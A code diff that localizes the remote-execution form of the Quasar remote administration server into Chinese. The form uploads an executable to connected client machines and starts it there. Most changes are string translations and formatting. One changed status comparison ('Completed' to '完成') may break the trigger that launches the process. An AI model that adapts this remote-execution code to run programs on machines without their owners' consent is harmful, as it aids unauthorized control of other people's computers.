@@ -45,14 +45,16 @@ namespace Quasar.Server.Forms
             {
                 var remoteExecutionMessageHandler = new RemoteExecutionMessageHandler
                 {
-                    FileHandler = new FileManagerHandler(client), TaskHandler = new TaskManagerHandler(client)
+                    FileHandler = new FileManagerHandler(client),
+                    TaskHandler = new TaskManagerHandler(client)
                 };
 
                 var lvi = new ListViewItem(new[]
                 {
                     $"{client.Value.Username}@{client.Value.PcName} [{client.EndPoint.Address}:{client.EndPoint.Port}]",
-                    "Waiting..."
-                }) {Tag = remoteExecutionMessageHandler};
+                    "等待中..."
+                })
+                { Tag = remoteExecutionMessageHandler };
 
                 lstTransfers.Items.Add(lvi);
                 _remoteExecutionMessageHandlers.Add(remoteExecutionMessageHandler);
@@ -87,7 +89,7 @@ namespace Quasar.Server.Forms
 
         private void FrmRemoteExecution_Load(object sender, EventArgs e)
         {
-            this.Text = WindowHelper.GetWindowTitle("Remote Execution", _clients.Length);
+            this.Text = WindowHelper.GetWindowTitle("远程执行", _clients.Length);
         }
 
         private void FrmRemoteExecution_FormClosing(object sender, FormClosingEventArgs e)
@@ -130,7 +132,7 @@ namespace Quasar.Server.Forms
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 ofd.Multiselect = false;
-                ofd.Filter = "Executable (*.exe)|*.exe";
+                ofd.Filter = "可执行文件 (*.exe)|*.exe";
                 if (ofd.ShowDialog() == DialogResult.OK)
                 {
                     txtPath.Text = Path.Combine(ofd.InitialDirectory, ofd.FileName);
@@ -159,13 +161,13 @@ namespace Quasar.Server.Forms
         {
             for (var i = 0; i < lstTransfers.Items.Count; i++)
             {
-                var handler = (RemoteExecutionMessageHandler) lstTransfers.Items[i].Tag;
+                var handler = (RemoteExecutionMessageHandler)lstTransfers.Items[i].Tag;
 
                 if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                 {
-                    lstTransfers.Items[i].SubItems[(int) TransferColumn.Status].Text = transfer.Status;
+                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = transfer.Status;
 
-                    if (transfer.Status == "Completed")
+                    if (transfer.Status == "完成")
                     {
                         handler.TaskHandler.StartProcess(transfer.RemotePath, _isUpdate);
                     }
@@ -188,7 +190,7 @@ namespace Quasar.Server.Forms
 
                 if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                 {
-                    lstTransfers.Items[i].SubItems[(int) TransferColumn.Status].Text = message;
+                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = message;
                     return;
                 }
             }
@@ -204,7 +206,7 @@ namespace Quasar.Server.Forms
 
                 if (handler.FileHandler.Equals(sender as FileManagerHandler) || handler.TaskHandler.Equals(sender as TaskManagerHandler))
                 {
-                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = result ? "Successfully started process" : "Failed to start process";
+                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = result ? "启动进程成功" : "启动进程失败";
                     return;
                 }
             }
